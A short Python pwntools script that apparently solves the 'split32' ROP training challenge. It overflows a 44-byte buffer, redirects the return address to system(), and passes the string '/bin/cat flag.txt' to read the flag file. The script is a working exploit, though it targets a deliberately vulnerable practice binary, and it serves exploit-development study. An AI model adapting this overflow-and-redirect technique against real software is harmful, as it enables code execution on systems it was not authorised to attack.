from pwn import *

p = process("./split32")

system_addr = 0x08048430
str_addr = 0x0804a030	#/bin/cat flag.txt
ls_addr = 0x08048747	#bin/ls

payload = ''
payload += "A"*44
payload += p32(system_addr)
payload += 'BBBB'
payload += p32(str_addr)

p.sendline(payload)
p.interactive()
